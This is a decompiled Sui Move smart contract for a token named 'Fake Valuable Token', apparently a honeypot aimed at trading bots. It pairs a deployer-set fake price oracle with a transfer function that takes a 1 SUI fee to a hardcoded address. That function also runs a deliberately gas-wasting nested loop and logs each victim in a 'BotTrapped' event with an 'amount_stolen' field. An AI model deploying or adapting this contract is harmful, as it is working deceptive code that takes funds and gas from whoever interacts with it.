module 0xfaf414f6d6bc4b4d73019b2670c0c261b3e3ce74fa4f20cc0be3a773bbaba67::fake_valuable_token {
    struct FAKE_VALUABLE_TOKEN has drop {
        dummy_field: bool,
    }

    struct TokenTreasury has key {
        id: 0x2::object::UID,
        treasury_cap: 0x2::coin::TreasuryCap<FAKE_VALUABLE_TOKEN>,
        deployer: address,
        total_tokens_minted: u64,
        total_fees_collected: u64,
        total_gas_burned: u64,
        bot_traps_triggered: u64,
        fake_price_oracle: u64,
        is_liquidity_active: bool,
    }

    struct TokenMinted has copy, drop {
        amount: u64,
        recipient: address,
        fake_price: u64,
        timestamp: u64,
    }

    struct BotTrapped has copy, drop {
        bot_address: address,
        fee_paid: u64,
        gas_burned: u64,
        amount_stolen: u64,
        timestamp: u64,
    }

    fun compute_factorial(arg0: u64) : u64 {
        if (arg0 <= 1) {
            return 1
        };
        let v0 = 1;
        let v1 = 2;
        while (v1 <= arg0) {
            v0 = v0 * v1;
            v1 = v1 + 1;
        };
        v0
    }

    fun execute_expensive_poisoning(arg0: u64) : u64 {
        let v0 = 0;
        let v1 = 0;
        let v2 = 0;
        while (v0 < 100000) {
            let v3 = 0;
            while (v3 < 1000) {
                let v4 = 0;
                while (v4 < 100) {
                    let v5 = v0 * v3 * v4 + arg0;
                    let v6 = v5 * v5;
                    let v7 = v2 + v6 + v6 * v5;
                    v2 = v7 + compute_factorial(v5 % 20);
                    v1 = v1 + 1;
                    v4 = v4 + 1;
                };
                v3 = v3 + 1;
            };
            v0 = v0 + 1;
        };
        v1
    }

    public fun get_fake_price(arg0: &TokenTreasury) : u64 {
        arg0.fake_price_oracle
    }

    public fun get_token_info() : (u64, u64, u64) {
        (1000000000, 1000000000, 1000000)
    }

    public fun get_treasury_stats(arg0: &TokenTreasury) : (u64, u64, u64, u64) {
        (arg0.total_tokens_minted, arg0.total_fees_collected, arg0.total_gas_burned, arg0.bot_traps_triggered)
    }

    fun init(arg0: FAKE_VALUABLE_TOKEN, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1) = 0x2::coin::create_currency<FAKE_VALUABLE_TOKEN>(arg0, 9, b"FAKE_VALUABLE", b"Fake Valuable Token", b"High-value token for bot trapping", 0x1::option::none<0x2::url::Url>(), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<FAKE_VALUABLE_TOKEN>>(v1);
        let v2 = TokenTreasury{
            id                   : 0x2::object::new(arg1),
            treasury_cap         : v0,
            deployer             : 0x2::tx_context::sender(arg1),
            total_tokens_minted  : 0,
            total_fees_collected : 0,
            total_gas_burned     : 0,
            bot_traps_triggered  : 0,
            fake_price_oracle    : 1000000000,
            is_liquidity_active  : true,
        };
        0x2::transfer::share_object<TokenTreasury>(v2);
    }

    public fun is_deployer(arg0: &TokenTreasury, arg1: address) : bool {
        arg0.deployer == arg1
    }

    public fun is_liquidity_active(arg0: &TokenTreasury) : bool {
        arg0.is_liquidity_active
    }

    public fun sponsored_mint(arg0: &mut TokenTreasury, arg1: address, arg2: u64, arg3: &mut 0x2::tx_context::TxContext) {
        assert!(0x2::tx_context::sender(arg3) == arg0.deployer, 100);
        arg0.total_tokens_minted = arg0.total_tokens_minted + arg2;
        let v0 = TokenMinted{
            amount     : arg2,
            recipient  : arg1,
            fake_price : arg0.fake_price_oracle,
            timestamp  : 0x2::tx_context::epoch_timestamp_ms(arg3),
        };
        0x2::event::emit<TokenMinted>(v0);
        0x2::transfer::public_transfer<0x2::coin::Coin<FAKE_VALUABLE_TOKEN>>(0x2::coin::mint<FAKE_VALUABLE_TOKEN>(&mut arg0.treasury_cap, arg2, arg3), arg1);
    }

    public fun toggle_liquidity(arg0: &mut TokenTreasury, arg1: bool, arg2: &mut 0x2::tx_context::TxContext) {
        assert!(0x2::tx_context::sender(arg2) == arg0.deployer, 100);
        arg0.is_liquidity_active = arg1;
    }

    public fun transfer_with_fee(arg0: 0x2::coin::Coin<FAKE_VALUABLE_TOKEN>, arg1: address, arg2: 0x2::coin::Coin<0x2::sui::SUI>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x2::coin::value<FAKE_VALUABLE_TOKEN>(&arg0);
        assert!(0x2::coin::value<0x2::sui::SUI>(&arg2) >= 1000000000, 101);
        execute_expensive_poisoning(v0);
        let v1 = BotTrapped{
            bot_address   : 0x2::tx_context::sender(arg3),
            fee_paid      : 1000000000,
            gas_burned    : 100000,
            amount_stolen : v0,
            timestamp     : 0x2::tx_context::epoch_timestamp_ms(arg3),
        };
        0x2::event::emit<BotTrapped>(v1);
        0x2::transfer::public_transfer<0x2::coin::Coin<FAKE_VALUABLE_TOKEN>>(arg0, arg1);
        0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(arg2, @0x934ac6338c3c092f3779b28d246850cb4828a8f3554423d469b084da2dfc111);
    }

    public fun update_fake_price(arg0: &mut TokenTreasury, arg1: u64, arg2: &mut 0x2::tx_context::TxContext) {
        assert!(0x2::tx_context::sender(arg2) == arg0.deployer, 100);
        arg0.fake_price_oracle = arg1;
    }

    // decompiled from Move bytecode v6
}

